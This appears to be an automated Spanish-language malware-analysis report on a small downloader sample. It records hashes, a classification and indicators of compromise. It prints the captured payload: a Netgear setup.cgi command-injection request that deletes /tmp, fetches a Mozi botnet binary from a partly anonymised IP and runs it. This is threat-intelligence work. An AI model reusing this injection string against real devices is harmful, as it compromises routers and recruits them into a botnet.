# 🧬 Payload Analysis

`00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09`

## 📌 Resumen

Texto ASCII de 177 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://160.30.142.XXX:60115/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://160.30.142.XXX:60115/Mozi.m -O /tmp/netge` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09.md](../../../../../malware-like/oraculo/downloader/00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:10:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09`
- **SHA1:** `dfe6b8e2a7e5e339ebe67fd001954fd076c4a73e`
- **MD5:** `13bea62ebe0a9dfbb033ce197bc650f9`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 177 B |
| Entropía | 5.14 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://160.30.142.XXX:60115/Mozi.m+-O+/tmp/netge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://160.30.142.XXX:60115/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 160.30.142.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://160.30.142.XXX:60115/Mozi.m+-O+/tmp/netge | strings |
| hash | 00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
